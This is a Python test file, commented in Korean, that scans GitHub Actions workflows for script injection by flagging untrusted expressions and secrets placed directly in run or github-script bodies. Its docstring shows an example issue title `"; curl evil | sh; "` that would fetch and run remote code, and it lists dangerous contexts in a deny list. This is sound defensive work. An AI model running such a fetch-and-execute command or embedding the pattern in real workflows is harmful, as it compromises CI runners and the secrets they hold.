"""워크플로우 스크립트 주입 방지 (#646).

`run:` 본문이나 actions/github-script 의 `script:` 본문에 `${{ ... }}` 로 외부 입력을
직접 넣으면, 러너가 **스크립트를 실행하기 전에 문자열 치환**한다. 값에 따옴표, `$(...)`,
백틱이 있으면 스크립트가 깨지거나 의도하지 않은 명령이 실행된다. 이 워크플로들은
쓰기 권한이나 서명 키와 스토어 시크릿이 있는 환경에서 돈다.

    # 나쁨: 이슈 제목이 "; curl evil | sh; " 이면 그대로 실행된다
    run: echo "${{ github.event.issue.title }}"

    # 좋음: 값은 데이터로만 전달되고 스크립트 소스에는 들어가지 않는다
    env:
      TITLE: ${{ github.event.issue.title }}
    run: echo "$TITLE"                       # github-script 는 process.env.TITLE

`env:` / `with:` 의 다른 키 / `if:` 안의 사용은 스크립트 소스가 아니므로 검사하지 않는다.
"""
import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[3]
WF = ROOT / ".github" / "workflows"

_EXPR = re.compile(r"\$\{\{(.*?)\}\}", re.DOTALL)

# 스크립트 본문에 직접 들어가면 안 되는 컨텍스트 (접두 일치: 끝이 '.' 인 것)
DANGEROUS_PREFIX = (
    "github.event.client_payload.",
    "github.event.inputs.",
    "secrets.",
)
# 정확히 일치할 때만 위험한 컨텍스트
DANGEROUS_EXACT = (
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.head_ref",
    "github.ref_name",           # 브랜치명에는 $ ( ) 백틱 따옴표를 쓸 수 있다
    "github.ref",
    "github.event.head_commit.message",
)
# 앞 스텝/잡이 외부 문자열(댓글, 브랜치명, 이슈 제목)을 그대로 실어 나르는 출력 이름.
# 이 이름들로 출력을 만들면 여기서도 걸린다 (오염이 스텝 출력을 타고 넘어오는 경로).
TAINTED_OUTPUT = re.compile(
    r"^(?:steps|needs)\.[\w-]+\.outputs\."
    r"(?:branch_name|branchName|custom_branch|customBranch|issue_title|errorMessage)$"
)

# 정수로만 쓰이는 필드. 문자열이 들어올 수 없는 것만 좁게 연다.
SAFE_EXPR = {
    # 앱 빌드 트리거가 PR/이슈 번호(정수)로만 채워 보낸다
    "github.event.client_payload.pr_number",
    "github.event.client_payload.issue_number",
    # workflow_dispatch 의 boolean 입력 (true/false 만 들어온다)
    "github.event.inputs.analyze_only",
    "github.event.inputs.enable_android",
    "github.event.inputs.enable_ios",
}

# 시크릿이 스크립트 소스에 들어가도 되는 예외. 값의 문자 집합을 GitHub 가 정한다.
SAFE_SECRETS = {
    "secrets.GITHUB_TOKEN",      # GitHub 가 발급하는 토큰 (영숫자와 밑줄만)
    "secrets._GITHUB_PAT_TOKEN", # 토큰 형식(ghp_/github_pat_ + 영숫자)
}
# appleboy/ssh-action 의 script 는 로컬 셸이 아니라 원격 서버 셸에서 도는 배포 스크립트이고,
# 시크릿을 넘기려면 envs: 로 바꿔 원격 셸의 변수 처리를 통째로 바꿔야 한다. 여기 들어가는
# 시크릿은 저장소 관리자가 넣는 배포 설정(도커 사용자명, 서버 주소 등)이라 공격자 입력 경로가
# 아니다. 브랜치명(github.ref_name)도 같은 이유로 예외다: 이 배포 워크플로들은 push 트리거가
# 고정 브랜치(main/develop)로 한정돼 있고, 수동 실행(workflow_dispatch)은 쓰기 권한자만 할 수
# 있어 워크플로 파일을 고칠 수 있는 사람과 같다. 그 밖의 외부 입력 컨텍스트(댓글, 이슈 제목,
# client_payload, 댓글에서 뽑은 브랜치명 출력 등)는 이 스텝에서도 똑같이 막는다.
SSH_ACTION = "appleboy/ssh-action"
SSH_EXEMPT_EXACT = {"github.ref_name", "github.ref"}


def _files():
    return sorted(list(WF.rglob("*.yaml")) + list(WF.rglob("*.yml")))


def _script_bodies():
    """(파일, 스텝 이름, 종류, 본문, uses) — run 과 with.script 본문."""
    out = []
    for f in _files():
        try:
            doc = yaml.safe_load(f.read_text(encoding="utf-8")) or {}
        except yaml.YAMLError:
            continue
        for jname, job in (doc.get("jobs") or {}).items():
            for st in (job or {}).get("steps") or []:
                if not isinstance(st, dict):
                    continue
                name = st.get("name") or "(이름 없음)"
                if isinstance(st.get("run"), str):
                    out.append((f, f"{jname}/{name}", "run", st["run"], ""))
                w = st.get("with")
                if isinstance(w, dict) and isinstance(w.get("script"), str):
                    out.append((f, f"{jname}/{name}", "script", w["script"], str(st.get("uses") or "")))
    return out


_TOKEN = re.compile(r"[A-Za-z_][\w.\-]*")


def _violations(body, uses=""):
    """본문 안의 ${{ }} 중 위험한 컨텍스트 토큰 목록."""
    bad = []
    for m in _EXPR.finditer(body):
        for tok in _TOKEN.findall(m.group(1)):
            if tok in SAFE_EXPR or tok in SAFE_SECRETS:
                continue
            if uses.startswith(SSH_ACTION) and (
                    tok.startswith("secrets.") or tok in SSH_EXEMPT_EXACT):
                continue
            if (tok.startswith(DANGEROUS_PREFIX) or tok in DANGEROUS_EXACT
                    or TAINTED_OUTPUT.match(tok)):
                bad.append(tok)
    return bad


def test_scripts_are_collected():
    """수집이 비면 아래 검사가 전부 공회전한다."""
    assert len(_script_bodies()) > 100


def test_no_untrusted_expression_in_script_source():
    found = []
    for f, step, kind, body, uses in _script_bodies():
        for e in _violations(body, uses):
            found.append(f"{f.relative_to(ROOT)} [{step}] ({kind}): {e}")
    assert not found, (
        "스크립트 본문에 외부 입력/시크릿이 직접 삽입됨. 스텝 env: 로 옮기고 "
        '"$VAR" 또는 process.env.VAR 로 읽을 것:\n' + "\n".join(found)
    )


def test_detector_catches_known_bad_patterns():
    """검사기 자체가 살아 있는지 (오탐 0 만 확인하면 죽은 검사기도 통과한다)."""
    assert _violations('echo "${{ github.event.issue.title }}"')
    assert _violations("const b = '${{ github.event.client_payload.branch_name }}';")
    assert _violations('echo "${{ secrets.X }}" > f')
    assert _violations("x=${{github.head_ref}}")
    assert _violations('echo "${{ github.ref_name }}"')
    assert _violations("const b = '${{ steps.s.outputs.branchName }}';")
    assert _violations('T="${{ needs.p.outputs.issue_title }}"')
    assert _violations("echo ${{ github.event_name == 'x' && github.event.client_payload.branch_name || github.ref_name }}")
    # 원격 서버 배포 스크립트의 시크릿만 예외, 외부 입력은 여기서도 막는다
    assert not _violations("h=${{ secrets.SERVER_HOST }}", "appleboy/ssh-action@v1")
    assert _violations("b=${{ github.head_ref }}", "appleboy/ssh-action@v1")
    assert not _violations("t=${{ secrets.GITHUB_TOKEN }}")
    assert not _violations("n=${{ github.event.client_payload.pr_number }}")
    assert not _violations("r=${{ github.run_id }} ${{ github.repository }}")


@pytest.mark.skipif(shutil.which("node") is None, reason="node 없음")
def test_github_script_blocks_are_valid_js(tmp_path):
    """github-script 본문을 env 방식으로 바꾼 뒤 JS 문법이 유지되는지."""
    bad = []
    for i, (f, step, kind, body, uses) in enumerate(_script_bodies()):
        if kind != "script" or not uses.startswith("actions/github-script"):
            continue
        # 표현식은 임의 식별자로 치환. async 본문이라 함수로 감싸 await/return 을 허용한다.
        src = _EXPR.sub("__EXPR__", body)
        js = tmp_path / f"s{i}.js"
        js.write_text("(async () => {\n" + src + "\n})();\n", encoding="utf-8")
        r = subprocess.run(["node", "--check", str(js)], capture_output=True, text=True)
        if r.returncode != 0:
            bad.append(f"{f.relative_to(ROOT)} [{step}]: {r.stderr.strip().splitlines()[0:4]}")
    assert not bad, "\n".join(bad)
